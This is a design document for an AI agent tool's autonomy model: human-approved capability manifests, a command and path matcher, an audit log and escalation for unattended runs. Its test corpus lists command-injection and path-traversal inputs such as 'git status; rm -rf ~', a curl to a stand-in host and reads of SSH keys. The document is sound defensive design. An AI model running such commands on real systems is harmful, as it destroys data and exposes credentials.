# Autonomy model

**Date:** 2026-08-17
**Status:** approved, not yet implemented

## Why

Robin's first promise, stated in the first screen of the README, is that a tool
call always finds a human — and is refused when nobody is there. `approvals.ts`
enforces it literally: `broadcast()` returns the number of clients that could
answer, and zero means no.

That rule is why running the Telegram bridge without `--allow-tools` is safe
rather than merely quiet. It is also a wall in front of everything this project
wants to build next. A scheduled job at 3am has no human by definition, so under
today's rule every tool call it makes is refused and the job does nothing at
all. Five parallel subagents have a human, but interrupting them five times over
is the prompt-fatigue failure the README already names as the reason
`create_skill` was removed. A remote execution backend keeps the human but moves
the blast radius somewhere `sensitive-paths.ts` was never reasoning about.

Three planned subsystems — scheduler, subagents, execution backends — each need
an answer to the same question. Without a shared one, each will invent its own
escape hatch, and the weakest of the three becomes Robin's real security
posture.

This milestone adds no user-facing feature. It defines what consent means when
nobody is at the keyboard, so the three that follow can rely on it.

**Success criterion:** an unattended run can perform exactly the actions a human
approved in advance, no others; every action it takes is on disk afterwards; and
no manifest that can be written unlocks a path `sensitive-paths.ts` protects.

## Decisions taken

| Question | Decision |
|---|---|
| What a standing grant is scoped to | A capability manifest, declared and approved when the job is created |
| When consent is collected | At authoring time, while a human is present — not at execution time |
| Who writes the manifest | The model proposes; the human approves or edits. Never self-granted |
| What happens out-of-manifest | Nothing new: it falls through to the existing approval path |
| How command patterns match | Parsed argv, exact `argv[0]`, shell metacharacters refused outright |
| Whether a manifest can widen file access | No. It adds permission; it never removes a check |

### The central move: consent shifts from execution time to authoring time

The reason unattended execution is hard is that consent is collected at the
moment of the tool call, and at 3am there is nobody to collect it from. Rather
than weaken what happens at 3am, this design collects consent earlier — when you
type `robin cron add`, sitting at the keyboard, paying attention.

The manifest is the record of that conversation. At execution time nothing is
being decided; a decision already made is being looked up.

### Rejected: per-schedule auto-approve

`approvals.ts:136` already has `autoApprove`, a per-session boolean that is the
old `--allow-tools`. A scheduler could set it and ship tomorrow. This is what
hermes-agent effectively does, and it was rejected because it grants everything
for the whole run: the distinction between "back up the repo" and "delete the
repo" disappears, and the only safety left is an audit log read after the damage.

An audit trail is worth having and this design keeps one. It is not worth having
*instead* of a constraint.

### Rejected: narrow rules granted as you go

Keep granting at execution time but make the unit specific — an exact command
rather than a whole `kind`. This is a smaller change and it improves the
interactive path. It does not solve the problem: an unattended run still has
nobody to ask the first time it meets something new, so the first run of any
schedule does nothing and grants accumulate only through attended use.

Worth doing later as a refinement of the interactive path. It is not the
autonomy model.

### Rejected: park the run until a human answers

The strictest reading — suspend and wait however long it takes. Rejected
because a half-finished job holding state for days is its own hazard, runs pile
up behind the parked one, and the failure is silent. Refusing and continuing is
both louder and closer to what already happens.

## Architecture

New module `src/autonomy/`, organised to mirror `trust-store.ts`, which already
solves the persistence half of this problem.

### `manifest.ts` — types and matcher

Pure functions, no I/O, no dependency on the gateway. This is where the security
argument lives, so it must be testable in isolation.

```ts
// Derived from ConfirmRequest['kind'] rather than restated, so a new kind added
// to execute.ts cannot silently become a kind no manifest can express.
export type RuleKind = ConfirmRequest['kind'];

export interface Rule {
  kind: RuleKind;
  pattern: string;
}

export interface Manifest {
  created: string;           // ISO 8601
  rules: Rule[];
  expires: string | null;    // ISO 8601, or null for no expiry
  escalate?: { surface: string; windowMinutes: number };
}

/** Does this manifest permit this request? Never throws. */
export function permits(manifest: Manifest, request: ConfirmRequest, now: Date): boolean;
```

`permits` returns false for anything it does not positively recognise, matching
the posture `command-safety.ts` states: an allowlist, not a blocklist, where a
false negative costs one refused call and a false positive runs something
destructive unattended.

### `grant-store.ts` — persistence

`~/.robin/autonomy.json`, written `0o600` into a directory created `0o700`,
`chmod`ed after write because `writeFile`'s `mode` applies only on create — the
same three details `trust-store.ts:99-108` already gets right.

```jsonc
{
  "version": 1,
  "manifests": {
    "nightly-backup": {
      "created": "2026-08-17T09:12:00Z",
      "rules": [
        { "kind": "run_command", "pattern": "git *" },
        { "kind": "run_command", "pattern": "restic backup *" },
        { "kind": "read_file",   "pattern": "~/code/**" }
      ],
      "expires": null,
      "escalate": { "surface": "telegram", "windowMinutes": 240 }
    }
  }
}
```

An explicit `version` discriminator, not shape-guessing, for the reason
`parseTrustFile` gives. Fails closed: an unreadable or malformed file is treated
as empty, so every manifest stops granting rather than silently granting
something misparsed.

### `audit.ts` — append-only record

`~/.robin/audit/<manifest-id>.jsonl`, one JSON object per line, appended never
rewritten:

```jsonc
{"ts":"2026-08-17T03:00:04Z","manifest":"nightly-backup","kind":"run_command",
 "detail":"git push origin main","decision":"allowed","rule":"git *"}
{"ts":"2026-08-17T03:00:09Z","manifest":"nightly-backup","kind":"run_command",
 "detail":"restic snapshot","decision":"refused","rule":null}
```

Both decisions are recorded. A log of only the allowed calls answers "what did
it do" but not "what did it try to do", and the second question is the one that
tells you a manifest is wrong or a model is behaving oddly.

Audit failure never blocks a tool call: a full disk must not become a way to
make Robin refuse everything, and it equally must not become a way to act
unrecorded. Write errors are surfaced on the run's report.

## Enforcement

One insertion in `ApprovalRegistry.ask()`, between the `autoApprove` check
(`approvals.ts:136`) and the standing-answers check (`:140`):

```
autoApprove?           -> yes           (unchanged; interactive --allow-tools)
manifest permits?      -> yes, audited  (NEW — the only new grant path)
session allowedKinds?  -> yes           (unchanged)
declinedKinds?         -> no            (unchanged)
declined this reply?   -> no            (unchanged)
broadcast to humans    ->               (unchanged)
approvers === 0        -> no            (unchanged)
```

### Out-of-manifest reuses the existing path

This is the load-bearing decision and it is deliberately the absence of new
code. A call the manifest does not cover is not specially refused; it simply
carries on down the function it already went down.

The consequences fall out for free:

- Running a schedule manually with a terminal attached prompts you normally,
  because `broadcast()` finds a client. The manifest silences the calls you
  already approved and asks about the rest.
- Running it at 3am refuses, because `approvers === 0` already means no.
- The model retrying a refused call seven ways is already handled: `declined`
  remembers refusals for the rest of the reply, for exactly this reason.

There is no second refusal mechanism to keep in step with the first.

### Escalation

When a manifest carries `escalate`, `broadcast()` additionally offers the
pending approval to that surface, and the registry's `timeoutMs` for that
request becomes `windowMinutes`. An answer arriving in time settles it through
`answer()` — which already takes an `approvalId`, an `approved` flag, a `by`
string and a scope, and already tolerates being called for an entry that has
gone.

Answering `yes` with the default scope `once` settles that call and nothing
more.

Persisting the answer needs a **new scope, `manifest`** — it cannot reuse
`session`. `answer()` with scope `session` adds the request's `kind` to
`allowedKinds` (`approvals.ts:111-115`), and `kind` is one of four coarse
values: it would turn "yes, run `restic snapshot`" into "yes, run any command
for the rest of this session", which is the blank cheque this design exists to
avoid. The new scope adds the *specific rule* to the manifest on disk and
touches `allowedKinds` not at all.

`ApprovalScope` therefore becomes `'once' | 'session' | 'reply' | 'manifest'`,
and `manifest` is meaningful only for manifest-governed sessions; elsewhere it
is treated as `once`, which is the safe reading the type's existing comment
already asks for.

An escalation that expires is a refusal, recorded as `"decision":"expired"`.

### Two invariants a manifest cannot break

**Sensitive paths still win.** `sensitive-paths.ts` runs regardless of manifest.
A rule granting `read_file ~/**` does not grant `~/.ssh/id_rsa`. There is no
manifest anyone can write, or the model can propose, that reaches a protected
path — the manifest is consulted only to skip *asking*, never to skip *checking*.

**The model cannot grant itself capability.** Robin drafts a manifest from the
task text at creation time and prints it; it becomes consent when the human
accepts or edits it. This is the posture skills already take ("installing asks
first") and `PERSONALITY.md` already takes. A manifest written by the model and
applied without review would be `create_skill` again, with a shell.

## Matching

### `run_command`

In order, refusing at the first failure:

| Check | Rule |
|---|---|
| Shell control characters | Refused if `SHELL_CONTROL_PATTERN` matches — reused from `command-safety.ts:15`. A manifest entry authorises one process, never a shell script |
| Tokenise | `splitTokens`, reused |
| Executing flags | Refused if any token is in `EXECUTING_FLAGS` — reused. `-exec`, `--output`, `-o` and friends turn a reader into a writer |
| Exec-injection flags | Refused if any token is in `MANIFEST_DENIED_FLAGS` for this `argv[0]`. **Keyed per executable, not global** — `-c` turns `git` into an arbitrary-code runner, but is an ordinary flag to `docker` and `tar`, and a global denylist would refuse commands it has no business refusing. `git`: `-c`, `--exec-path`, `--upload-pack`, `--receive-pack`, `--pager`, `--ssh-command`. `ssh`: `-o`, `ProxyCommand`. An executable with no entry has no extra denials, on top of the `EXECUTING_FLAGS` check above which is global |
| `argv[0]` | Must equal the pattern's head exactly, case-folded on Windows only. `gitfoo` never matches `git` |
| Remaining tokens | Positional. A `*` matches exactly one token; a trailing `*` matches the rest, including nothing |

`--version`-style probes get no special case here. `command-safety.ts` already
lets those through without a prompt, so they never reach the manifest.

### `read_file` and `write_file`

The pattern is a path glob. The candidate path is resolved to absolute and
passed through `realpath` *before* matching, so a symlink inside `~/code`
pointing at `/etc` does not match `~/code/**`. A path that cannot be resolved —
because it does not exist yet, the normal case for `write_file` — resolves its
nearest existing ancestor instead and matches against that.

`~` expands to the home directory at match time, not at write time, so a
manifest stays portable.

### `mcp_tool`

The pattern matches `server.tool`, with `*` permitted as the tool half only:
`github.*` is expressible, `*.create_issue` is not. Trusting a server is already
a decision `TrustStore` records under its own category; the manifest narrows
which of that server's tools an unattended run may reach, and there is no case
for "any server that happens to offer this tool name".

## Components

### New, under `src/autonomy/`

| File | Holds |
|---|---|
| `manifest.ts` | `Rule`, `Manifest`, `permits()`, the matchers, `MANIFEST_DENIED_FLAGS` |
| `grant-store.ts` | `AutonomyStore` — read, write, add rule, expire; holds the `autonomy.json.lock` read-modify-write lock used when escalation adds a rule |
| `audit.ts` | `AuditLog` — append, read back for `robin cron audit` |

### Changed

| File | Change |
|---|---|
| `src/gateway/approvals.ts` | `ApprovalRegistry` takes an optional manifest per session; one lookup inserted in `ask()`; `broadcast()` consults `escalate`; per-request `timeoutMs` override; `ApprovalScope` gains `'manifest'` |
| `src/tools/command-safety.ts` | `SHELL_CONTROL_PATTERN`, `EXECUTING_FLAGS` and `splitTokens` exported for reuse. No behaviour change |

### Unchanged

`sensitive-paths.ts`, `execute.ts`, `trust-store.ts`, every provider, every
channel, the protocol. This milestone adds a grant path; it does not alter what
a tool does or how one is described to a model.

## Failure modes

| Situation | Behaviour |
|---|---|
| `autonomy.json` corrupt or unreadable | Treated as empty. Every manifest stops granting; unattended runs refuse everything and say why |
| Manifest expired | Not consulted. Same as absent |
| Audit write fails | Tool call proceeds; error surfaced on the run report. Neither blocks nor hides |
| Escalation surface unreachable | Falls back to the ordinary broadcast, so an attached terminal still sees it |
| Two runs share a manifest | Reads are independent; a rule added by escalation is a read-modify-write under a lock file, last writer wins |
| Manifest names a rule that no longer parses | That rule alone is skipped, not the manifest. Logged once per load |

## Non-goals

- The scheduler itself. This milestone is consumed by it, not part of it.
- Subagents and execution backends, the other two consumers.
- Narrowing the *interactive* grant unit from `kind` to something specific.
  Worth doing; a separate change to a path this one does not touch.
- Any UI for editing manifests beyond print-and-approve at creation time.
- Revoking a grant mid-run. Stopping a run is the scheduler's concern.

## Testing

TDD, against the existing vitest setup. `manifest.ts` is pure, so the matcher
tests come first and carry the weight.

**The bypass corpus.** A table-driven test of commands that must *not* match
`git *`, written before the matcher exists and reviewed harder than anything
else here:

```
git status; rm -rf ~          shell metacharacter
git status && curl evil.sh    shell metacharacter
git status `id`               shell metacharacter
git status $(id)              shell metacharacter
gitfoo status                 argv[0] mismatch
git --exec-path=/tmp status   exec-injection flag
git -c core.pager=sh log      exec-injection flag
git --ssh-command=sh fetch    exec-injection flag
git diff --output=/etc/x      executing flag
GIT=x git status              argv[0] is not git
```

Plus the symmetric corpus for paths: `~/code/../.ssh/id_rsa`, a symlink from
`~/code/link` to `/etc`, `~/code/../../etc/passwd`.

**Invariant tests**, stated as their own cases because they are the promises:

- No manifest permits a `sensitive-paths.ts` path. Property-style: for every
  protected path, a manifest granting `~/**` still refuses it.
- A corrupt `autonomy.json` grants nothing.
- An expired manifest grants nothing.
- Both allowed and refused decisions reach the audit log.
- Scope `manifest` adds one rule and leaves `allowedKinds` empty — the coarse
  session grant must not be a side effect of a narrow answer.

**Integration**, under `tests/gateway/`: a session with a manifest and no
attached client runs in-manifest calls and refuses out-of-manifest ones; the
same session with a client attached prompts for the out-of-manifest one instead.
That pair is the whole design in two tests.
